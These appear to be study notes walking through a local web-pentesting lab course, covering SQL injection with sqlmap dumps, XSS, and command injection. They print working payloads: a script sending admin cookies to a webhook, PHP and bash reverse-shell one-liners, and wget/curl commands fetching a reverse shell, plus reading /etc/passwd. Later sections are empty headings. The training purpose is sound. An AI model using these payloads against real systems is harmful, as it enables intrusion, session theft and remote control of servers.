# Find & Exploit Common Web Vulnerabilities

## Lab Setup

### With PimpMyKali

1. To install Docker and Docker Compose, run [PimpMyKali](https://github.com/Dewalt-arch/pimpmykali) with `./pimpmykali.sh` and select option 7.

2. To set up the labs, run [PimpMyKali](https://github.com/Dewalt-arch/pimpmykali) again with `./pimpmykali.sh` and select option E.

### Custom Setup

1. Alternatively, open a terminal on your Kali Linux virtual machine and run the following commands:

   ```bash
   sudo apt update
   sudo apt install docker.io
   sudo curl -L "https://github.com/docker/compose/releases/download/v2.29.0/docker-compose-linux-x86_64" -o /usr/local/bin/docker-compose
   sudo chmod +x /usr/local/bin/docker-compose
   ```

2. Verify that Docker Compose is installed correctly:

   ```bash
   docker-compose version
   ```

3. Restart your virtual machine.

4. Download the web labs from TCM's link: [**labs**](https://cdn.fs.teachablecdn.com/NgPnyKOwSfWYuwnX3Lzb).

5. Copy the labs to your desired location and extract the files:

   ```bash
   tar -xf peh-web-labs.tar.gz
   cd labs
   sudo docker-compose up
   ```

   > The last command starts multiple containers using a single YAML file. You can also run it in the background using `-d` (detached mode).

   Here are some other useful commands:

   ```
   # List all running containers
   sudo docker ps -a
   # Stop the containers
   sudo docker-compose stop
   # Removing the containers, it will also list container ID that are stopped
   sudo docker rm $(sudo docker ps -aq)
   ```

### Running the Lab

The first time you run the lab, it will take some time to download necessary dependencies. Subsequent runs will be much faster. Once you see that `mysqld` and `mysqlx` are "ready for connections," the setup is complete.

1. Set the necessary permissions for the web server, which is required for the file upload labs and the capstone challenge. Run the following command in a separate terminal tab (use `Ctrl+Shift+T` to open a new tab):

```bash
./set-permissions.sh
```

2. Open your browser and navigate to [http://localhost](http://localhost).

3. The first time you load the lab, the database will need to be initialized. Follow the instructions in the red box by clicking the link, then return to the homepage.

> **Note:** If at any point you mess up the tables or database of the labs, you can reset it by visiting [http://localhost/init.php](http://localhost/init.php).

## SQL Injection - Introduction

SQL Injection (SQLi) is a critical vulnerability that occurs when an attacker can manipulate SQL queries by injecting malicious input. This can lead to unauthorized access, data manipulation, or even complete control over the database.

### Basic SQL commands

```bash
sudo systemctl start mysql
sudo mysql
```

```sql
CREATE DATABASE demo_db;
USE demo_db;
CREATE TABLE users (
        id INT AUTO_INCREMENT PRIMARY KEY,
        username VARCHAR(255) NOT NULL,
        password VARCHAR(255) NOT NULL,
        age INT NOT NULL
    );
INSERT INTO users (username, password, age) VALUES ('alice', 'password123', 30);
INSERT INTO users (username, password, age) VALUES ('bob', 'securepass', 25);
SELECT * FROM users;
EXIT;
```

### Common SQL Injection Characters and Techniques

1. **Special Characters**:
   Certain characters are commonly used to exploit SQL Injection vulnerabilities:

   - **Single Quote (`'`)**: Often used to break out of string literals in SQL queries.
   - **Double Quote (`"`)**: Used similarly to single quotes, depending on the SQL dialect.
   - **Semicolon (`;`)**: Can be used to terminate one query and start another.

2. **Basic Injection Example**:

   - **`' OR 1=1 -- `**: A common SQL Injection payload. It manipulates the SQL query to always return true, potentially bypassing authentication or exposing data.
     - **`'`**: Ends the current string literal.
     - **`OR 1=1`**: Always evaluates to true, altering the query logic.
     - **`--`**: SQL comment syntax that ignores the rest of the query.

3. **Commenting Out Query**:
   - **`--`**: A SQL comment that can be used to ignore the rest of a query. This is often used in conjunction with injection payloads to ignore parts of the original query.

## SQL Injection - UNION

The `UNION` operator in SQL is used to combine the results of two or more `SELECT` statements. However, for the `UNION` to work correctly, there are two important conditions that must be met:

The number of columns in both `SELECT` statements must be the same.
The data types of the corresponding columns must be compatible.
When performing SQL injection, attackers often use the `UNION` operator to extract additional information from different tables or columns within the same table. However, to successfully use `UNION`, the number of columns in the injected `SELECT` statement must match the number of columns in the original query.

Determining the Number of Columns
To determine the number of columns in the original query, attackers may inject a series of `NULL` values into the `UNION` statement and increase the count of `NULL`s iteratively until the query executes successfully. This technique is often referred to as a "column enumeration attack."

For example, if the original query is:

```sql
SELECT username, email FROM injection0x01 WHERE username = 'jeremy';
```

An attacker might start with: `jeremy' UNION SELECT NULL #`

If the number of `NULL` values does not match the number of columns in the original query, an error will be returned.

The attacker will then increment the number of `NULL` values: `jeremy' UNION SELECT NULL, NULL, NULL #`

Once we've identified a vulnerable input field, we can start injecting SQL queries to extract valuable information from the database:

- Get the Database Version: `' union select null,null,version()#`
- Discover Available Tables: `'union select null, null,table_name from information_schema.tables#`
- Discover Available Columns: `'union select null, null,column_name from information_schema.columns#`

To solve the challenge:

- Identify Columns in a Specific Table: `' UNION SELECT null, null, column_name FROM information_schema.columns WHERE table_name = 'injection0x01' #`
- Extract Data from the Target Table: `' UNION SELECT email, null, password FROM injection0x01 #`

This will return the list of email addresses and their corresponding passwords:

```
Username: jeremy@example.com - Email: jeremyspassword
Username: jessamy@example.com - Email: jessamyspassword
Username: bob@example.com - Email: bobspassword
```

## SQL Injection - Blind

### BurpSuite

1. Open BurpSuite.
2. Add `http://localhost` to the Target > Scope section.
3. Open `http://localhost/labs/i0x02.php` in BurpSuite's browser (or in Firefox via FoxyProxy).
4. Log in with the credentials `jeremy:jeremy`, and send the request to the Repeater.
   - A successful request returns a response with a `Content-Length` of 1928.
   - When the credentials are incorrect, the `Content-Length` is 2122.

### SQLMap

1. Copy the POST request into a text file (e.g., `request.txt`).
2. To use SQLMap, run the command: `sqlmap -r request.txt`
3. SQLMap didn't find any potential vulnerabilities in this request.

### Substring in Cookies

- We have a GET request with the session parameter in the Cookie. We can try to intercept that and add a substring for testing.
- Modify the request as follows: `Cookie: session=6967cabefd763ac1a1a88e11159957db' and substring('alex',1,1)='a'#`
- Since the injected condition is true (the first character of the string 'alex' is 'a'), the query returns a result, and the web page loads normally. This confirms that we can inject substrings.

### BurpSuite Intruder

- We can use BurpSuite's Intruder tool to test each letter of the alphabet to find the first letter in Jessamy's password. Set up the payload as follows: `Cookie: session=6967cabefd763ac1a1a88e11159957db' and substring((select password from injection0x02 where username = 'jessamy'),1,1)='§letter§'#`
- The correct payload will yield a different `Content-Length`. Here, the password starts with Z, the `Content-Length` is 1347 instead of 2247/48.

### SQLMap

- Save the GET request without the substring payload in a file (e.g., `request2.txt`).
- Run SQLMap with the following command: `sqlmap -r request2.txt --level=2`. `level=2` is for cookies as parameter. Agree to all prompts as needed.

```
sqlmap identified the following injection point(s) with a total of 366 HTTP(s) requests:
---
Parameter: session (Cookie)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: session=6967cabefd763ac1a1a88e11159957db' AND 1204=1204 AND 'DBbN'='DBbN

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: session=6967cabefd763ac1a1a88e11159957db' AND (SELECT 1206 FROM (SELECT(SLEEP(5)))xhQZ) AND 'hVfr'='hVfr
---
```

- To retrieve the credentials, use the following command: `sqlmap -r request2.txt --level=2 -T injection0x02 --dump`

```
Database: peh-labs
Table: injection0x02
[2 entries]
+---------------------+--------------+----------+--------------------------------------------+
| email               | password     | username | session                                    |
+---------------------+--------------+----------+--------------------------------------------+
| jeremy@example.com  | jeremy       | jeremy   | 6967cabefd763ac1a1a88e11159957db (jeremy)  |
| jessamy@example.com | ZWFzdGVyZWdn | jessamy  | 9dedc6891e2839a791ed37157f1241fe (jessamy) |
+---------------------+--------------+----------+--------------------------------------------+
```

## SQL Injection - Challenge Walkthrough

### Union-Based Injection

- Determine the Number of Columns: `Senpai Knife Set' UNION SELECT NULL, NULL, NULL, NULL #`
- Discover Available Tables: `Senpai Knife Set' UNION SELECT NULL, NULL, NULL, table_name from information_schema.tables #`, we have `injection0x03_products` and `injection0x03_users`
- Retrieve Data from a Table: `Senpai Knife Set' UNION SELECT NULL, NULL, NULL, password from injection0x03_users #`, we get username: `takeshi`
- `Senpai Knife Set' UNION SELECT NULL, NULL, NULL, password from injection0x03_users #`, we get password: `onigirigadaisuki`

### BurpSuite

- Intercept the POST request in BurpSuite.
- Change the product to `test`.
- Save the modified request to a file named `request3.txt`.

### SQLMap

- Dump the Table Data: `sqlmap -r request3.txt -T injection0x03_users --dump`

```
Database: peh-labs
Table: injection0x03_users
[1 entry]
+------------------+----------+
| password         | username |
+------------------+----------+
| onigirigadaisuki | takeshi  |
+------------------+----------+
```

> **Note**: Feel free to use this [cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

## XSS - Introduction

Cross-Site Scripting (XSS) is a well-known vulnerability in web applications, though its prevalence is declining as many modern frameworks include built-in protection against XSS by default. XSS is an injection attack where malicious JavaScript code is injected into a web application with the intention of being executed by other users.

### Types of XSS

- **Reflected XSS**: The injected script is reflected off the web server in the response. It occurs when the malicious script is included in the request and is immediately executed in the response without being stored.

- **Stored XSS**: The injected script is permanently stored on the target server, such as in a database. This type of XSS is more dangerous as it can affect multiple users. A variant of stored XSS is **Blind XSS**, where the attacker cannot see the payload's effect directly and might only be able to test it through indirect methods.

- **DOM-Based XSS**: The attack occurs within the client-side JavaScript code, and the injection happens in the Document Object Model (DOM). The malicious script is executed as a result of the DOM manipulation rather than server-side code.

## XSS - DOM Lab

- In this lab, there is an input field that allows us to add entries to a to-do list. No data is sent to a server, as confirmed by checking the Network section of the browser's inspector. This suggests the presence of a DOM-based XSS vulnerability.

- To test for XSS, enter the following payload into the input field: `<img src=x onerror="prompt(1)">`. This payload uses a fake image URL to trigger an error, causing the `onerror` event to execute the JavaScript code. The prompt box appears. It indicates the presence of a DOM-based XSS vulnerability.

## XSS - Stored Lab

- For this lab, you'll need two Firefox add-ons:

  - [Firefox Multi-Account Containers](https://addons.mozilla.org/fr/firefox/addon/multi-account-containers/)
  - [Cookie-Editor](https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/)

- After installing the add-ons, open the lab in two separate containers (e.g., `Personal` and `Work`).

- In the `Personal` container:

  - Click on "Allow" in the Cookie-Editor interface and add a fake cookie.
  - Open the browser console and type `document.cookie`. You should see your fake cookie displayed.

- In the `Work` container:

  - Enter the same `document.cookie` command in the console. You should receive an empty string, confirming that the sessions are separate.

- To test for stored XSS:

  - In the `Personal` container, enter a comment: `<h1>test</h1>`. The HTML should be reflected in the comment.
  - Switch to the `Work` container and refresh the page. You should see the same comment `<h1>test</h1>`.

  This indicates a stored XSS vulnerability, as the input from the `Personal` container is reflected and visible in the `Work` container.

## XSS - Challenge Walkthrough

In this challenge, we need to understand how to use a Webhook to capture and observe the payload in action.

1. Set Up Your Webhook: Use a service like [Webhook.site](Webhook.site) to generate a unique Webhook URL.
2. Add the following payload in the message field where XSS can be injected:
   ```html
   <script>
     let i = new Image();
     i.src = "https://webhook.site/<webhook_id>?" + document.cookie;
   </script>
   ```
3. Monitor the Webhook: Keep an eye on the Webhook service dashboard. Open `http://localhost/labs/x0x03_admin.php`. When the admin panel refreshes or interacts with the payload, you will receive requests at your Webhook URL.
4. Capture the Admin’s Cookie: The Webhook requests will contain the `document.cookie` from the admin’s session. Review these requests to obtain the admin’s cookie.

## Command Injection - Introduction

Command injection is a vulnerability that allows an attacker to manipulate an application into executing arbitrary system commands on the server. This occurs when an application passes unsafe data, often user input, to a system shell.

For example, a vulnerable web application might take a file path from a query parameter and use it to read a file, like so:

```
$file = $_GET['file'];
system("cat /var/www/html/$file");
```

If an attacker uses a payload such as `; ls -la` in the `file` parameter, they can make the application execute an additional command that lists all files in the current directory.

Command injection can often lead to:

- Remote code execution
- Denial of Service
- Data breach
- Privilege escalation

Source: [AppSecExplained](https://appsecexplained.gitbook.io/appsecexplained/common-vulns/command-injection)

## Command Injection - Basics

- There is a field to enter web URLs, which returns a response code on the screen. It also displays the command executed in the backend to retrieve the result.
- Test for command injection vulnerability: Use the payload `; sleep 10`. If the response takes 10 seconds, it confirms that we can inject commands.
- Gather information about the machine: Use `; uname -a; asd`. `asd` is a harmless string used to ensure the command injection works correctly without causing syntax errors. The output reveals `Linux 002aabef9f88 6.8.11-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.8.11-1kali2 (2024-05-30) x86_64 GNU/Linux`.
- Retrieve passwords: `; cat /etc/passwd; asd`

### Bash TCP

- Refer to [Bash TCP payloads](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#bash-tcp)
- Find Bash Path: `; which bash; asd`. It gives us `/bin/bash`
- Open a port on your machine: `nc -lvnp 4242`
- Attempt Bash TCP reverse shel: `; /bin/bash -l > /dev/tcp/192.168.92.128/4242 0<&1 2>&1; asd`. It doesn't work.

### PHP

- Refer to [PHP payloads](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#php)
- Find PHP path: `; which php; asd`. It gives us `/usr/local/bin/php`
- Open a port on your machine: `nc -lvnp 4242`
- Attempt Bash TCP reverse shel: `; /usr/local/bin/php -r '$sock=fsockopen("192.168.92.128",4242);exec("/bin/sh -i <&3 >&3 2>&3");' asd`. This should establish a reverse shell connection to your machine.

## Command Injection - Blind / Out-of-Band

### Verify Command Execution

- The command executed in the backend is no longer printed out. Create a webhook address using [Webhook.site](https://webhook.site/).
- Test the command execution by entering: `https://webhook.site/<webhook_id>?"whoami"`. Check the Webhook.site interface for a request with the payload in the query string. This confirms that we can execute commands.

### Set Up the Python HTTP Server

- Start a Python HTTP server on your machine: `python3 -m http.server 80800`
- Use the following payload to test if requests can be made: `http://tcm-sec.com \\n wget 192.168.92.128:8080/test`. `\\n` (newline) ensures that the command is executed correctly. A `404` error in your server logs indicates that requests are being made successfully.

### Prepare the PHP Reverse Shell

- On your Linux machine, locate and copy the PHP reverse shell script using: `cp /usr/share/webshells/laudanum/php/php-reverse-shell.php .`. This copies the reverse shell script to your current directory.
- Edit the `php-reverse-shell.php` file to update the IP address and port number to match your attacker's machine IP address and the port you will be listening on (`4444`).

### Deploy the Reverse Shell

#### Upload the Reverse Shell

There are two methods to upload the reverse shell:

- **Method 1**: Use `wget` to download the reverse shell directly:

  ```bash
  http://tcm-sec.com \\n wget 192.168.92.128:8080/php-reverse-shell.php
  ```

- **Method 2**: Use `curl` to download and save the reverse shell:

  ```bash
  http://tcm-sec.com && curl 192.168.92.128:8080/php-reverse-shell.php > /var/www/html/php-reverse-shell.php
  ```

#### Set Up Netcat to Listen for the Reverse Shell

On your attacker machine, start a Netcat listener on port 4444:

```bash
nc -nvlp 4444
```

After using the second method, connect to `http://localhost/php-reverse-shell.php` to trigger the reverse shell.

## Command Injection - Challenge Walkthrough

- Test Command Injection: Experiment with the input fields. Commands can be executed if you use the format `<random-value>)^2))}';<command>;#`. We get `www-data` printed for Y.
- Open a port on your machine: `nc -lvnp 4242`
- Use a PHP Reverse Shell Payload: `<random-value>)^2))}';php -r '$sock=fsockopen("192.168.92.128",4242);exec("/bin/sh -i <&3 >&3 2>&3");';#`. This payload will create a PHP one-liner that connects back to your Netcat listener, providing a shell on the target machine.

## Insecure File Upload - Introduction

Insecure File Upload is a vulnerability that arises when an application permits the uncontrolled and unvalidated upload of files. This vulnerability can be exploited by attackers to upload malicious files, such as web shells, which can then be used to execute arbitrary code, leak sensitive data, or perform other malicious actions.

### Example Scenario

Consider an application that allows users to upload profile pictures without verifying the file type and content, or without properly managing the file storage. An attacker could upload a PHP shell script disguised as an image file. When this file is accessed on the server, the malicious script can be executed, leading to a security breach.

### Potential Impacts

- Remote Code Execution (RCE): Attackers can execute arbitrary code on the server by uploading and running malicious files.
- Data Leakage: Sensitive data may be exposed or accessed if attackers can read or modify files on the server.
- Server Compromise: Successful attacks can lead to full server compromise, giving attackers control over the server environment.

Source: [AppSecExplained](https://appsecexplained.gitbook.io/appsecexplained/common-vulns/insecure-file-upload)

## Insecure File Upload - Basic Bypass

## Insecure File Upload - Magic Bytes

## Insecure File Upload - Challenge Walkthrough

## Attacking Authentication - Intro

## Attacking Authentication - Brute Force

## Attacking Authentication - MFA

## Attacking Authentication - Challenge Walkthrough

## XXE - External Entities Injection

## IDOR - Insecure Direct Object Reference

## Capstone - Introduction

## Capstone - Solution
